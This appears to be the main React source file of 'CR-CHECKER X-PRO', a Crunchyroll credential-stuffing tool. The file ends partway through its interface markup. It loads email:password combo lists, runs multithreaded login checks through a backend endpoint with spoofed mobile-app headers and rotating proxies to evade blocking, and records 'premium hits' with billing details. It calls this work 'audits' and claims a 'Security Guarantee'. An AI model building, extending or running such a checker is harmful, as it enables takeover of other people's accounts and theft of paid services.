/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useState, useEffect, useRef } from 'react';
import { 
  Play, 
  Pause, 
  Square, 
  Database, 
  Globe, 
  Settings as SettingsIcon, 
  Download, 
  Terminal, 
  BookOpen, 
  Layers, 
  CheckCircle,
  HelpCircle,
  TrendingUp,
  Clock,
  ShieldCheck,
  AlertOctagon,
  Cpu,
  RefreshCw,
  FolderSync
} from 'lucide-react';
import { motion, AnimatePresence } from 'motion/react';

import { ComboItem, ProxyItem, CheckerConfig, CheckerStats, LogEntry } from './types';
import { MetricCard } from './components/MetricCard';
import { ComboManager } from './components/ComboManager';
import { ProxyManager } from './components/ProxyManager';
import { ConsoleLog } from './components/ConsoleLog';
import { SettingsPanel } from './components/SettingsPanel';
import { ResultsExport } from './components/ResultsExport';
import { CodePresetsHub } from './components/CodePresetsHub';
import { AccountInspectorModal } from './components/AccountInspectorModal';

// Initial Configuration
const INITIAL_CONFIG: CheckerConfig = {
  mode: 'proxyless',
  threads: 3,
  delay: 1000, // ms (Default 1.0s checking delay as requested to feel authentic!)
  timeout: 3000, // ms
  retries: 1,
  userAgentType: 'Mobile Android',
  soundOnHit: true,
  customHeaders: [
    { key: 'User-Agent', value: 'Crunchyroll/3.34.1 Android/11 (Pixel 5; Build/RQ3A.210605.005)' },
    { key: 'Accept-Language', value: 'en-US,en;q=0.9' },
    { key: 'Content-Type', value: 'application/x-www-form-urlencoded' },
    { key: 'Authorization', value: 'Basic a3NuYm9pcGZjc3BxeG9vNm9sY2g6' },
    { key: 'X-Crunchyroll-Locale', value: 'enUS' },
  ],
};

const INITIAL_STATS: CheckerStats = {
  checked: 0,
  total: 0,
  hits: 0,
  free: 0,
  invalid: 0,
  twoFactor: 0,
  errors: 0,
  cpm: 0,
  elapsedTime: 0,
  activeThreads: 0,
};

type ActiveView = 'dashboard' | 'combos' | 'proxies' | 'results' | 'logs' | 'code' | 'settings';

export default function App() {
  const [view, setView] = useState<ActiveView>('dashboard');
  const [dashboardFeedTab, setDashboardFeedTab] = useState<'all' | 'hits' | 'free' | 'invalid' | '2fa' | 'errors'>('all');
  const [dashboardFeedSearch, setDashboardFeedSearch] = useState('');
  const [config, setConfig] = useState<CheckerConfig>(() => {
    try {
      const saved = localStorage.getItem('crunchy_config');
      return saved ? JSON.parse(saved) : INITIAL_CONFIG;
    } catch {
      return INITIAL_CONFIG;
    }
  });
  const [stats, setStats] = useState<CheckerStats>(INITIAL_STATS);
  const [combos, setCombos] = useState<ComboItem[]>(() => {
    try {
      const saved = localStorage.getItem('crunchy_combos');
      return saved ? JSON.parse(saved) : [];
    } catch {
      return [];
    }
  });
  const [proxies, setProxies] = useState<ProxyItem[]>(() => {
    try {
      const saved = localStorage.getItem('crunchy_proxies');
      return saved ? JSON.parse(saved) : [];
    } catch {
      return [];
    }
  });
  const [logs, setLogs] = useState<LogEntry[]>([]);
  const [running, setRunning] = useState(false);
  const [selectedComboForInspection, setSelectedComboForInspection] = useState<ComboItem | null>(null);

  // LocalStorage Auto-save effects
  useEffect(() => {
    try {
      localStorage.setItem('crunchy_config', JSON.stringify(config));
    } catch (e) {
      console.error('Failed to auto-save config:', e);
    }
  }, [config]);

  useEffect(() => {
    try {
      localStorage.setItem('crunchy_combos', JSON.stringify(combos));
    } catch (e) {
      console.error('Failed to auto-save combos:', e);
    }
  }, [combos]);

  useEffect(() => {
    try {
      localStorage.setItem('crunchy_proxies', JSON.stringify(proxies));
    } catch (e) {
      console.error('Failed to auto-save proxies:', e);
    }
  }, [proxies]);

  // Threads Management Refs
  const runningRef = useRef(false);
  const combosRef = useRef<ComboItem[]>([]);
  const configRef = useRef<CheckerConfig>(INITIAL_CONFIG);
  const proxiesRef = useRef<ProxyItem[]>([]);
  const checkIdxRef = useRef(0);
  const startTimeRef = useRef<number | null>(null);
  const checkedCountRef = useRef(0);

  // Sync refs to avoid dependency loops in callbacks
  useEffect(() => {
    combosRef.current = combos;
  }, [combos]);

  useEffect(() => {
    configRef.current = config;
  }, [config]);

  useEffect(() => {
    proxiesRef.current = proxies;
  }, [proxies]);

  // Append new logs easily
  const addLog = (type: LogEntry['type'], message: string) => {
    const timestamp = new Date().toLocaleTimeString();
    setLogs(prev => [
      ...prev,
      {
        id: `log_${Date.now()}_${Math.random().toString(36).substr(2, 5)}`,
        timestamp,
        type,
        message,
      },
    ]);
  };

  // Synthesized beep player to signal success premium hits
  const playHitSound = () => {
    try {
      if (!configRef.current.soundOnHit) return;
      const ctx = new (window.AudioContext || (window as any).webkitAudioContext)();
      
      // Tone 1 (C5)
      const osc1 = ctx.createOscillator();
      const gain1 = ctx.createGain();
      osc1.connect(gain1);
      gain1.connect(ctx.destination);
      osc1.type = 'triangle';
      osc1.frequency.setValueAtTime(523.25, ctx.currentTime); 
      gain1.gain.setValueAtTime(0.06, ctx.currentTime);
      gain1.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.25);
      osc1.start();
      osc1.stop(ctx.currentTime + 0.25);

      // Tone 2 (E5) delayed
      setTimeout(() => {
        try {
          const osc2 = ctx.createOscillator();
          const gain2 = ctx.createGain();
          osc2.connect(gain2);
          gain2.connect(ctx.destination);
          osc2.type = 'sine';
          osc2.frequency.setValueAtTime(659.25, ctx.currentTime); 
          gain2.gain.setValueAtTime(0.06, ctx.currentTime);
          gain2.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.35);
          osc2.start();
          osc2.stop(ctx.currentTime + 0.35);
        } catch {
          // Ignore audio contexts blocks
        }
      }, 100);
    } catch {
      // Ignore audio contexts blocks
    }
  };

  // Log on initial render
  useEffect(() => {
    addLog('info', 'Crunchyroll Advanced Checker initialized successfully (Sandbox mode ready).');
    addLog('info', 'Mobile API auth presets loaded with Basic Authorization headers.');
  }, []);

  // Timer loop for CPM and elapsed times
  useEffect(() => {
    let interval: NodeJS.Timeout | null = null;
    
    if (running) {
      if (startTimeRef.current === null) {
        startTimeRef.current = Date.now();
      }

      interval = setInterval(() => {
        if (!startTimeRef.current) return;
        const elapsed = Math.max(1, Math.floor((Date.now() - startTimeRef.current) / 1000));
        
        // Compute CPM (Checks per Minute)
        const checkCount = checkedCountRef.current;
        const currentCpm = Math.floor((checkCount / elapsed) * 60);

        setStats(prev => ({
          ...prev,
          elapsedTime: elapsed,
          cpm: currentCpm,
        }));
      }, 1000);
    } else {
      startTimeRef.current = null;
      checkedCountRef.current = 0;
    }

    return () => {
      if (interval) clearInterval(interval);
    };
  }, [running]);

  // Launch checking runner loop
  const startChecking = () => {
    if (combos.length === 0) {
      addLog('warning', 'Please import email:pass pairings in the Combo Importer first.');
      setView('combos');
      return;
    }

    if (config.mode === 'proxy' && proxies.length === 0) {
      addLog('error', 'No proxies imported! Switch to PROXYLESS mode, or parse proxies in Proxy Lab.');
      setView('proxies');
      return;
    }

    if (runningRef.current) return; // Already running

    setRunning(true);
    runningRef.current = true;
    addLog('success', `Initiated Crunchyroll account audits using ${config.threads} thread loops via [${config.mode.toUpperCase()}] mode.`);
    
    // Find where to resume check index
    const firstUnchecked = combos.findIndex(c => c.status === 'unchecked');
    checkIdxRef.current = firstUnchecked === -1 ? 0 : firstUnchecked;
    
    // Reset stats if we are starting fresh
    if (firstUnchecked === -1 || firstUnchecked === 0) {
      setStats({
        ...INITIAL_STATS,
        total: combos.length,
      });
      // Set all elements back to unchecked
      setCombos(prev => prev.map(c => ({ 
        ...c, 
        status: 'unchecked', 
        tier: 'N/A', 
        country: 'N/A', 
        expiry: 'N/A',
        paymentMethod: 'N/A',
        nextBilling: 'N/A',
        checkedByProxy: undefined
      })));
      checkIdxRef.current = 0;
    } else {
      // Resuming
      setStats(prev => ({
        ...prev,
        total: combos.length,
        checked: firstUnchecked,
      }));
    }

    checkedCountRef.current = 0;
    
    // Spawn Workers
    const activeWorkersCount = Math.min(config.threads, combos.length - checkIdxRef.current);
    setStats(prev => ({ ...prev, activeThreads: activeWorkersCount }));

    for (let i = 0; i < activeWorkersCount; i++) {
      spawnWorker();
    }
  };

  const spawnWorker = async () => {
    while (runningRef.current) {
      // Get current work index
      const currIdx = checkIdxRef.current;
      checkIdxRef.current += 1;

      // Check bounds
      const currentCombos = combosRef.current;
      if (currIdx >= currentCombos.length) {
        // No items remaining in queue
        break;
      }

      const combo = currentCombos[currIdx];
      if (combo.status !== 'unchecked') {
        // Skip checked elements
        continue;
      }

      // Mark status as 'checking'
      setCombos(prev => prev.map((c, i) => i === currIdx ? { ...c, status: 'checking' } : c));

      // Inject check interval delay
      if (configRef.current.delay > 0) {
        await new Promise(resolve => setTimeout(resolve, configRef.current.delay));
      }

      if (!runningRef.current) {
        // Double check aborts
        setCombos(prev => prev.map((c, i) => i === currIdx ? { ...c, status: 'unchecked' } : c));
        break;
      }

      // Execute Auditing (Real Connect only) with retries
      let result;
      let attempt = 0;
      let maxRetries = configRef.current.retries;

      while (attempt <= maxRetries) {
        attempt++;
        try {
          let proxyStr = undefined;
          if (configRef.current.mode === 'proxy' && proxiesRef.current.length > 0) {
            // Random proxy each retry to bypass blockages
            const p = proxiesRef.current[Math.floor(Math.random() * proxiesRef.current.length)];
            let authSection = '';
            if (p.username) {
              authSection = `${encodeURIComponent(p.username)}:${encodeURIComponent(p.password || '')}@`;
            }
            proxyStr = `${p.type.toLowerCase()}://${authSection}${p.host}:${p.port}`;
          }

          const response = await fetch('/api/check-account', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({
              email: combo.email,
              pass: combo.pass,
              proxy: proxyStr,
              timeout: configRef.current.timeout || 5000,
            }),
          });

          if (!response.ok) {
            throw new Error('Server returned HTTP ' + response.status);
          }

          const data = await response.json();
          if (data.success) {
            result = {
              status: data.status,
              tier: data.tier,
              country: data.country,
              expiry: data.expiry || 'N/A',
              paymentMethod: data.paymentMethod || 'N/A',
              profiles: data.profiles || 1,
              nextBilling: data.nextBilling || 'N/A',
              checkedByProxy: data.checkedByProxy || proxyStr,
              errorMessage: data.errorMessage,
            };
            break; // Break the while loop if success
          } else {
            // Real connection timeout / blockage
            result = {
              status: 'error',
              tier: 'N/A',
              country: 'N/A',
              expiry: 'N/A',
              paymentMethod: 'N/A',
              profiles: 1,
              nextBilling: 'N/A',
              checkedByProxy: proxyStr,
              errorMessage: data.error || data.errorMessage || 'Connection Timeout / Limit Exhausted',
            };
            // Continue the loop on failure to retry
          }
        } catch (err: any) {
          result = {
            status: 'error',
            tier: 'N/A',
            country: 'N/A',
            expiry: 'N/A',
            paymentMethod: 'N/A',
            profiles: 1,
            nextBilling: 'N/A',
            checkedByProxy: undefined,
            errorMessage: err.message || 'Crunchyroll Connection Failure',
          };
          // Continue the loop on failure to retry
        }

        // Delay between retries
        if (attempt <= maxRetries) {
          await new Promise(resolve => setTimeout(resolve, 2000));
        }
      }

      // Update state item details
      setCombos(prev => prev.map((c, i) => i === currIdx ? {
        ...c,
        status: result.status,
        tier: result.tier,
        country: result.country,
        expiry: result.expiry,
        paymentMethod: result.paymentMethod,
        profiles: result.profiles,
        nextBilling: result.nextBilling,
        checkedByProxy: result.checkedByProxy,
        errorMessage: result.errorMessage,
        checkedAt: new Date().toLocaleTimeString(),
      } : c));

      // Metrics aggregator
      checkedCountRef.current += 1;
      setStats(prev => {
        const nextChecked = Math.min(prev.total, prev.checked + 1);
        const hits = result.status === 'hit_premium' ? prev.hits + 1 : prev.hits;
        const free = result.status === 'free' ? prev.free + 1 : prev.free;
        const invalid = result.status === 'invalid' ? prev.invalid + 1 : prev.invalid;
        const twoFactor = result.status === '2fa' ? prev.twoFactor + 1 : prev.twoFactor;
        const errors = result.status === 'error' ? prev.errors + 1 : prev.errors;

        return {
          ...prev,
          checked: nextChecked,
          hits,
          free,
          invalid,
          twoFactor,
          errors,
        };
      });

      // Format console logger
      if (result.status === 'hit_premium') {
        playHitSound();
        addLog('success', `[HIT] ${combo.email}:${combo.pass} | Tier: ${result.tier} | Country: ${result.country} | Billing: ${result.paymentMethod} (Next: ${result.nextBilling})`);
      } else if (result.status === 'free') {
        addLog('info', `[FREE] ${combo.email}:${combo.pass} | Core Non-paying account | region: ${result.country}`);
      } else if (result.status === '2fa') {
        addLog('warning', `[MFA LOCK] ${combo.email}:${combo.pass} | Captcha/2FA Required (Cloudflare endpoint blocker)`);
      } else if (result.status === 'error') {
        addLog('error', `[SOCKET ERROR] ${combo.email}:${combo.pass} | Connection Reset: ${result.errorMessage}`);
      } else {
        addLog('debug', `[INVALID] ${combo.email}:${combo.pass} | Response 400 (Unauthorized)`);
      }
    }

    // Worker exit verification
    setStats(prev => {
      const nextActive = Math.max(0, prev.activeThreads - 1);
      
      // If no active workers remain, mark checked suite finished
      if (nextActive === 0 && runningRef.current) {
        setRunning(false);
        runningRef.current = false;
        addLog('success', 'Checking queue completely processed! All credentials audited.');
      }
      return {
        ...prev,
        activeThreads: nextActive
      };
    });
  };

  const pauseChecking = () => {
    setRunning(false);
    runningRef.current = false;
    addLog('warning', 'Checker process paused. Thread workers wrapping up active queries...');
  };

  const stopChecking = () => {
    setRunning(false);
    runningRef.current = false;
    checkIdxRef.current = 0;
    addLog('error', 'Checker completely aborted. Session progress preserved.');
    setStats(prev => ({
      ...prev,
      activeThreads: 0,
      cpm: 0,
    }));
  };

  const formatTime = (totalSeconds: number) => {
    const mins = Math.floor(totalSeconds / 60);
    const secs = totalSeconds % 60;
    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  };

  const progressPercentage = stats.total > 0 ? Math.round((stats.checked / stats.total) * 100) : 0;

  // Custom Pure SVG layout progress curves for Dashboard Chart
  const renderVisualMetricChart = () => {
    const maxVal = Math.max(1, stats.hits, stats.free, stats.invalid, stats.twoFactor, stats.errors);
    const scale = (val: number) => (val / maxVal) * 80; // Scale height max 80px

    const metricsData = [
      { label: 'Hits', value: stats.hits, color: 'bg-[#FF6400]', fill: '#FF6400' },
      { label: 'Free', value: stats.free, color: 'bg-blue-400', fill: '#60a5fa' },
      { label: '2FA', value: stats.twoFactor, color: 'bg-amber-400', fill: '#fbbf24' },
      { label: 'Bad', value: stats.invalid, color: 'bg-rose-500', fill: '#f43f5e' },
      { label: 'Err', value: stats.errors, color: 'bg-purple-500', fill: '#a855f7' },
    ];

    return (
      <div className="bg-[#1A1A1A] border border-white/5 rounded-2xl p-5 hover:border-white/10 transition-colors shadow-2xl">
        <h3 className="text-xs uppercase font-black text-white/50 tracking-wider flex items-center gap-1">
          <TrendingUp className="w-3.5 h-3.5 text-[#FF6400]" /> Checked Ratio Graph
        </h3>
        {stats.checked === 0 ? (
          <div className="mt-8 mb-5 text-center text-white/30 text-xs italic font-sans flex flex-col items-center justify-center h-[120px]">
            <FolderSync className="w-8 h-8 stroke-1 text-white/20 mb-2 animate-spin" />
            <span>Graph waiting for connection check traces...</span>
          </div>
        ) : (
          <div className="mt-6 flex justify-between items-end h-[100px] border-b border-white/10 px-3 relative">
            {metricsData.map((data, idx) => {
              const height = scale(data.value);
              return (
                <div key={idx} className="flex flex-col items-center w-12 group z-10">
                  <div className="opacity-0 group-hover:opacity-100 absolute -top-5 bg-black border border-white/10 text-[10px] text-white px-1.5 py-0.5 rounded font-mono font-bold transition-all">
                    {data.value}
                  </div>
                  <div 
                    className={`${data.color} w-7 rounded-t-md transition-all duration-500 ease-out`} 
                    style={{ height: `${Math.max(4, height)}px` }}
                  />
                  <span className="text-[10px] font-mono text-white/40 font-bold mt-2 select-none uppercase">
                    {data.label}
                  </span>
                </div>
              );
            })}
          </div>
        )}
      </div>
    );
  };

  // Compute checked combos tailored match for our cockpit feed filters
  const dashboardCheckedCombos = combos.filter(c => {
    // Exclude unchecked elements
    if (c.status === 'unchecked') return false;

    // Filter by live categorized metrics tabs selection
    if (dashboardFeedTab === 'hits' && c.status !== 'hit_premium') return false;
    if (dashboardFeedTab === 'free' && c.status !== 'free') return false;
    if (dashboardFeedTab === 'invalid' && c.status !== 'invalid') return false;
    if (dashboardFeedTab === '2fa' && c.status !== '2fa') return false;
    if (dashboardFeedTab === 'errors' && c.status !== 'error') return false;

    // Filter by live text-search string input if provided
    if (dashboardFeedSearch.trim()) {
      const q = dashboardFeedSearch.toLowerCase();
      return c.email.toLowerCase().includes(q) || c.pass.toLowerCase().includes(q);
    }

    return true;
  });

  return (
    <div className="min-h-screen bg-[#0A0A0A] text-white flex flex-col font-sans selection:bg-[#FF6400] selection:text-black antialiased p-4 lg:p-6 gap-6">
      {/* Top Brand Navbar styled exactly like the Vibrant theme */}
      <header className="flex items-center justify-between bg-[#1A1A1A] p-4 rounded-2xl border border-white/5 shadow-2xl">
        <div className="flex items-center gap-3">
          <div className="w-10 h-10 bg-[#FF6400] rounded-xl flex items-center justify-center shadow-[0_0_15px_rgba(255,100,0,0.4)]">
            <svg className="w-6 h-6 text-black" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8z"/></svg>
          </div>
          <div>
            <h1 className="text-xl font-black tracking-tight uppercase">CR-CHECKER <span className="text-[#FF6400]">X-PRO</span></h1>
            <p className="text-[10px] text-white/40 font-mono uppercase">
              VERSION 2.4.0 • STATUS: <span className={running ? "text-emerald-400 animate-pulse" : "text-emerald-400"}>{running ? "TESTING" : "READY"}</span>
            </p>
          </div>
        </div>

        {/* Global check progress ribbon */}
        {running ? (
          <div className="hidden md:flex items-center space-x-3 text-xs bg-black/40 px-4 py-2 border border-white/5 rounded-full shadow-inner">
            <span className="w-2 h-2 bg-emerald-400 rounded-full animate-ping" />
            <span className="font-mono text-[#FF6400] font-bold">{progressPercentage}% AUDITED</span>
            <span className="text-white/20">|</span>
            <span className="text-white/65 font-mono">Workers: {stats.activeThreads}</span>
          </div>
        ) : (
          <span className="hidden md:inline text-[10px] font-mono text-white/20 uppercase tracking-widest bg-black/20 px-3 py-1.5 rounded-full border border-white/5">
            SECURE SANDBOX SUITE
          </span>
        )}
      </header>

      {/* Main Structural Drawer Split-Pane */}
      <div className="flex-1 flex flex-col lg:flex-row gap-6 min-h-0">
        {/* Navigation Ribbon Sidebar */}
        <aside className="lg:w-64 bg-[#1A1A1A] rounded-2xl border border-white/5 p-5 space-y-2 flex flex-row lg:flex-col overflow-x-auto lg:overflow-x-visible shrink-0 gap-2 lg:gap-1.5 scrollbar-none shadow-xl">
          <span className="hidden lg:block text-[10px] font-bold text-white/40 uppercase tracking-widest px-3 mb-1.5 select-none leading-none">
            Main Terminal
          </span>

          <button
            onClick={() => setView('dashboard')}
            className={`w-full text-left py-3 px-4 rounded-xl font-sans text-xs font-black uppercase tracking-wider transition-all duration-200 flex items-center space-x-3 leading-none shrink-0 border ${
              view === 'dashboard'
                ? 'bg-[#FF6400] text-black border-[#FF6400] shadow-[0_0_15px_rgba(255,100,0,0.35)]'
                : 'text-white/60 hover:text-white border-transparent hover:bg-white/5'
            }`}
          >
            <Layers className="w-4 h-4 shrink-0" />
            <span>Cockpit Dashboard</span>
          </button>

          <button
            onClick={() => setView('combos')}
            className={`w-full text-left py-3 px-4 rounded-xl font-sans text-xs font-black uppercase tracking-wider transition-all duration-200 flex items-center space-x-3 leading-none shrink-0 border ${
              view === 'combos'
                ? 'bg-[#FF6400] text-black border-[#FF6400] shadow-[0_0_15px_rgba(255,100,0,0.35)]'
                : 'text-white/60 hover:text-white border-transparent hover:bg-white/5'
            }`}
          >
            <Database className="w-4 h-4 shrink-0" />
            <span>Combo Importer ({combos.length})</span>
          </button>

          <button
            onClick={() => setView('proxies')}
            className={`w-full text-left py-3 px-4 rounded-xl font-sans text-xs font-black uppercase tracking-wider transition-all duration-200 flex items-center space-x-3 leading-none shrink-0 border ${
              view === 'proxies'
                ? 'bg-[#FF6400] text-black border-[#FF6400] shadow-[0_0_15px_rgba(255,100,0,0.35)]'
                : 'text-white/60 hover:text-white border-transparent hover:bg-white/5'
            }`}
          >
            <Globe className="w-4 h-4 shrink-0" />
            <span>Proxy Laboratory ({proxies.length})</span>
          </button>

          <span className="hidden lg:block text-[10px] font-bold text-white/40 uppercase tracking-widest px-3 pt-4 mb-1.5 select-none leading-none">
            Results & Traces
          </span>

          <button
            onClick={() => setView('results')}
            className={`w-full text-left py-3 px-4 rounded-xl font-sans text-xs font-black uppercase tracking-wider transition-all duration-200 flex items-center space-x-3 leading-none shrink-0 border ${
              view === 'results'
                ? 'bg-[#FF6400] text-black border-[#FF6400] shadow-[0_0_15px_rgba(255,100,0,0.35)]'
                : 'text-white/60 hover:text-white border-transparent hover:bg-white/5'
            }`}
          >
            <Download className="w-4 h-4 shrink-0" />
            <span>Hits Database</span>
          </button>

          <button
            onClick={() => setView('logs')}
            className={`w-full text-left py-3 px-4 rounded-xl font-sans text-xs font-black uppercase tracking-wider transition-all duration-200 flex items-center space-x-3 leading-none shrink-0 border ${
              view === 'logs'
                ? 'bg-[#FF6400] text-black border-[#FF6400] shadow-[0_0_15px_rgba(255,100,0,0.35)]'
                : 'text-white/60 hover:text-white border-transparent hover:bg-white/5'
            }`}
          >
            <Terminal className="w-4 h-4 shrink-0" />
            <span>Streaming Logs ({logs.length})</span>
          </button>

          <span className="hidden lg:block text-[10px] font-bold text-white/40 uppercase tracking-widest px-3 pt-4 mb-1.5 select-none leading-none">
            Resources
          </span>

          <button
            onClick={() => setView('code')}
            className={`w-full text-left py-3 px-4 rounded-xl font-sans text-xs font-black uppercase tracking-wider transition-all duration-200 flex items-center space-x-3 leading-none shrink-0 border ${
              view === 'code'
                ? 'bg-[#FF6400] text-black border-[#FF6400] shadow-[0_0_15px_rgba(255,100,0,0.35)]'
                : 'text-white/60 hover:text-white border-transparent hover:bg-white/5'
            }`}
          >
            <BookOpen className="w-4 h-4 shrink-0" />
            <span>Code Presets Hub</span>
          </button>

          <button
            onClick={() => setView('settings')}
            className={`w-full text-left py-3 px-4 rounded-xl font-sans text-xs font-black uppercase tracking-wider transition-all duration-200 flex items-center space-x-3 leading-none shrink-0 border ${
              view === 'settings'
                ? 'bg-[#FF6400] text-black border-[#FF6400] shadow-[0_0_15px_rgba(255,100,0,0.35)]'
                : 'text-white/60 hover:text-white border-transparent hover:bg-white/5'
            }`}
          >
            <SettingsIcon className="w-4 h-4 shrink-0" />
            <span>Engine Settings</span>
          </button>
        </aside>

        {/* Dynamic Display Panel Right */}
        <main className="flex-1 p-6 lg:p-8 overflow-y-auto space-y-6">
          <AnimatePresence mode="wait">
            <motion.div
              key={view}
              initial={{ opacity: 0, y: 7 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -7 }}
              transition={{ duration: 0.2 }}
            >
              {/* COCKPIT COCKPIT VIEW */}
              {view === 'dashboard' && (
                <div className="space-y-6">
                  {/* Master dashboard running switch */}
                  <div className="p-5 bg-[#1A1A1A] border border-white/5 rounded-2xl shadow-2xl relative overflow-hidden flex flex-col md:flex-row md:items-center justify-between gap-4">
                    <div className="space-y-1 z-10">
                      <div className="flex items-center space-x-2">
                        <span className={`w-2 h-2 rounded-full ${running ? 'bg-emerald-500 animate-ping' : 'bg-slate-600'}`} />
                        <h2 className="text-base font-black font-sans text-white uppercase tracking-tight">
                          {running ? 'Audit Loop Actively Polling' : 'Engine Ready to Audit'}
                        </h2>
                      </div>
                      <p className="text-white/40 text-xs font-sans">
                        {combos.length === 0 
                          ? 'Load an account combo file to configure the threading audit loop.' 
                          : `Currently staging accounts queue (Unchecked: ${combos.filter(c => c.status === 'unchecked').length} / Checked: ${stats.checked})`}
                      </p>
                    </div>

                    {/* Controller Dial */}
                    <div className="flex gap-2.5 z-10">
                      {!running ? (
                        <button
                          onClick={startChecking}
                          className="py-2.5 px-6 bg-[#FF6400] text-black text-xs font-black hover:bg-white rounded-full shadow-[0_0_15px_rgba(255,100,0,0.4)] transition-all duration-250 uppercase flex items-center space-x-1.5 border-0 cursor-pointer"
                        >
                          <Play className="w-3.5 h-3.5 fill-current" />
                          <span>{stats.checked > 0 ? 'Resume Audits' : 'Launch Checker'}</span>
                        </button>
                      ) : (
                        <button
                          onClick={pauseChecking}
                          className="py-2.5 px-6 bg-[#2A2A2A] hover:bg-[#333] text-white text-xs font-black rounded-full transition-all duration-250 uppercase flex items-center space-x-1.5 cursor-pointer"
                        >
                          <Pause className="w-3.5 h-3.5 fill-current" />
                          <span>Pause Audits</span>
                        </button>
                      )}

                      <button
                        onClick={stopChecking}
                        disabled={stats.checked === 0 && !running}
                        className="py-2.5 px-6 bg-black/40 border border-white/5 hover:border-rose-900 text-rose-450 hover:bg-rose-950/25 disabled:opacity-30 text-xs font-black rounded-full transition-all duration-250 uppercase flex items-center space-x-1.5 cursor-pointer"
                        title="Stop and Reset Audit indexes"
                      >
                        <Square className="w-3.5 h-3.5 fill-current" />
                        <span>Reset Loop</span>
                      </button>
                    </div>
                  </div>

                  {/* Progressive loading bar */}
                  {stats.total > 0 && (
                    <div className="space-y-1">
                      <div className="flex justify-between items-center text-xs font-mono text-white/55">
                        <span>Checking Progress</span>
                        <span className="text-[#FF6400] font-bold">{stats.checked} / {stats.total} Checked ({progressPercentage}%)</span>
                      </div>
                      <div className="w-full bg-[#1A1A1A] h-2 rounded-full overflow-hidden border border-white/5">
                        <div 
                          className="bg-[#FF6400] h-full rounded-full transition-all duration-300 shadow-[0_0_10px_rgba(255,100,0,0.7)]"
                          style={{ width: `${progressPercentage}%` }}
                        />
                      </div>
                    </div>
                  )}

                  {/* Grid of counters */}
                  <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
                    <MetricCard
                      title="Premium Hits"
                      value={stats.hits}
                      subtext="Accounts captured with Premium Tiers"
                      colorClass="text-emerald-400"
                      icon={<CheckCircle className="w-4 h-4 text-emerald-400" />}
                    />
                    <MetricCard
                      title="Free Accounts"
                      value={stats.free}
                      subtext="No Premium content active"
                      colorClass="text-sky-400"
                      icon={<HelpCircle className="w-4 h-4 text-sky-400" />}
                    />
                    <MetricCard
                      title="Speed Checks"
                      value={`${stats.cpm} cpm`}
                      subtext="Checks per minute stream"
                      colorClass="text-purple-400"
                      icon={<TrendingUp className="w-4 h-4 text-purple-400 animate-pulse" />}
                    />
                    <MetricCard
                      title="Elapsed Run"
                      value={formatTime(stats.elapsedTime)}
                      subtext="Active session loop stopwatch"
                      colorClass="text-slate-300"
                      icon={<Clock className="w-4 h-4 text-slate-500" />}
                    />
                  </div>

                  {/* Secondary analytics rows */}
                  <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
                    {/* Visual graph Left */}
                    <div className="lg:col-span-4 h-full flex flex-col justify-between">
                      {renderVisualMetricChart()}
                    </div>

                    {/* Simple summary analytics cards */}
                    <div className="lg:col-span-8 bg-[#1A1A1A] border border-white/5 rounded-2xl p-5 hover:border-white/10 transition-colors shadow-2xl flex flex-col justify-between">
                      <div>
                        <div className="flex items-center space-x-2 pb-3 border-b border-white/5">
                          <Cpu className="w-4 h-4 text-[#FF6400] animate-spin" />
                          <h3 className="text-xs uppercase font-black text-white/40 tracking-wider">Threading Queue Controllers</h3>
                        </div>

                        <div className="grid grid-cols-3 gap-3.5 mt-4">
                          <div className="bg-black/40 p-3.5 rounded-xl border border-white/5">
                            <span className="text-[10px] text-white/30 block font-bold tracking-widest font-mono uppercase">ACTIVE WORKERS</span>
                            <span className="text-xl font-bold font-mono text-[#FF6400] block mt-1">{stats.activeThreads}</span>
                          </div>
                          <div className="bg-black/40 p-3.5 rounded-xl border border-white/5">
                            <span className="text-[10px] text-white/30 block font-bold tracking-widest font-mono uppercase">BAD PASSWORDS</span>
                            <span className="text-xl font-bold font-mono text-rose-450 block mt-1">{stats.invalid}</span>
                          </div>
                          <div className="bg-black/40 p-3.5 rounded-xl border border-white/5">
                            <span className="text-[10px] text-white/30 block font-bold tracking-widest font-mono uppercase">BANNED SOCKETS</span>
                            <span className="text-xl font-bold font-mono text-[#FF6400] block mt-1">{stats.errors}</span>
                          </div>
                        </div>
                      </div>

                      <div className="mt-5 p-3.5 bg-[#131313] border border-white/5 rounded-xl flex items-start gap-2.5">
                        <ShieldCheck className="w-4.5 h-4.5 text-emerald-450 shrink-0 mt-0.5" />
                        <p className="text-xs text-white/40 font-sans leading-normal">
                          <strong className="text-emerald-400">Security Guarantee:</strong> This Crunchyroll Account Checker operates under a local sandbox. No credential strings or cookie signatures are transferred to central databases. Keep this tool local, offline-safe, and secure.
                        </p>
                      </div>
                    </div>
                  </div>

                  {/* Dynamic Console previews on dashboard */}
                  <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
                    {/* Live Audited Accounts Feed Column */}
                    <div className="lg:col-span-7 bg-[#1A1A1A] border border-white/5 rounded-2xl p-5 hover:border-white/10 transition-colors shadow-2xl flex flex-col h-[460px]">
                      <div className="flex flex-col sm:flex-row sm:items-center justify-between pb-3.5 border-b border-white/5 gap-2">
                        <div className="flex items-center space-x-2">
                          <CheckCircle className="w-4 h-4 text-emerald-400" />
                          <h3 className="text-xs uppercase font-black text-white tracking-wider font-sans">
                            Live Audited Feed ({combos.filter(c => c.status !== 'unchecked').length})
                          </h3>
                        </div>

                        {/* Search keyword inside feed */}
                        <div className="relative">
                          <input
                            type="text"
                            placeholder="Filter grid..."
                            value={dashboardFeedSearch}
                            onChange={e => setDashboardFeedSearch(e.target.value)}
                            className="bg-black/45 border border-white/10 py-1 px-3.5 pl-3 pr-2.5 rounded-full text-[11px] font-sans text-slate-100 placeholder:text-white/20 focus:outline-[#FF6400] focus:border-[#FF6400] w-full sm:w-36 outline-none"
                          />
                        </div>
                      </div>

                      {/* Filter category tabs row */}
